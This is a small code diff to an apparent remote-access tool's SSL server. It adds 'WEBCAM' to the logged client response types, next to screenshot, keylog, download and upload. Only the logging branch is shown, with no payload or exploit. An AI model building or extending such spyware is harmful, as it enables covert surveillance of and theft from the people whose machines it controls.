@@ -216,7 +216,7 @@ class SSLServer:
             print(response)
 
         # Logging
-        if response_type in ("SCREENSHOT", "DOWNLOAD", "KEYLOG", "UPLOAD"):
+        if response_type in ("SCREENSHOT", "DOWNLOAD", "KEYLOG", "UPLOAD", "WEBCAM"):
             logger.info("Client responded with %s", response_type)
         else:
             logger.info("Client responded: %s", response)
